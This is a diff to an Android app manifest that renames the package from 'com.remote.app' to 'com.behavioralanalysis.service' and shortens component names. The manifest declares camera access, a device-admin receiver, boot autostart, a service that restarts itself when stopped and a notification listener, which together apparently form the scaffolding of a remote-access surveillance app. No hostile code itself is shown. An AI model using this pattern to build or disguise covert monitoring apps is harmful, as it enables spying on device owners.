@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.remote.app">
+    package="com.behavioralanalysis.service">
 
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.CAMERA" />
@@ -24,6 +24,7 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
 
     <application
+        android:name=".App"
         android:allowBackup="true"
         android:hardwareAccelerated="false"
         android:largeHeap="true"
@@ -34,7 +35,7 @@
         android:theme="@style/AppTheme">
         <uses-library android:name="org.apache.http.legacy" android:required="false" />
         <activity
-            android:name="com.behavioralanalysis.service.MainActivity"
+            android:name=".MainActivity"
             android:launchMode="singleInstance">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -44,13 +45,13 @@
         </activity>
 
         <service
-            android:name="com.behavioralanalysis.service.MainService"
+            android:name=".MainService"
             android:enabled="true"
             android:exported="false"
             />
 
         <receiver
-            android:name="com.behavioralanalysis.service.ServiceReceiver"
+            android:name=".ServiceReceiver"
             android:enabled="true"
             android:exported="true"
             android:label="RestartServiceWhenStopped">
@@ -60,7 +61,7 @@
         </receiver>
 
         <receiver
-            android:name="com.behavioralanalysis.service.CustomReceiver"
+            android:name=".CustomReceiver"
             android:enabled="true"
             android:exported="true">
             <intent-filter>
@@ -76,7 +77,7 @@
         </receiver>
 
         <receiver
-            android:name="com.behavioralanalysis.service.Admin"
+            android:name=".Admin"
             android:description="@string/device_description"
             android:label="@string/device_admin_label"
             android:permission="android.permission.BIND_DEVICE_ADMIN" >
@@ -89,14 +90,14 @@
             </intent-filter>
         </receiver>
 
-        <receiver android:name="com.behavioralanalysis.service.Autostart">
+        <receiver android:name=".Autostart">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED"></action>
             </intent-filter>
         </receiver>
 
         <service
-            android:name="com.behavioralanalysis.service.NotificationListener"
+            android:name=".NotificationListener"
             android:label="@string/app_name"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
             <intent-filter>
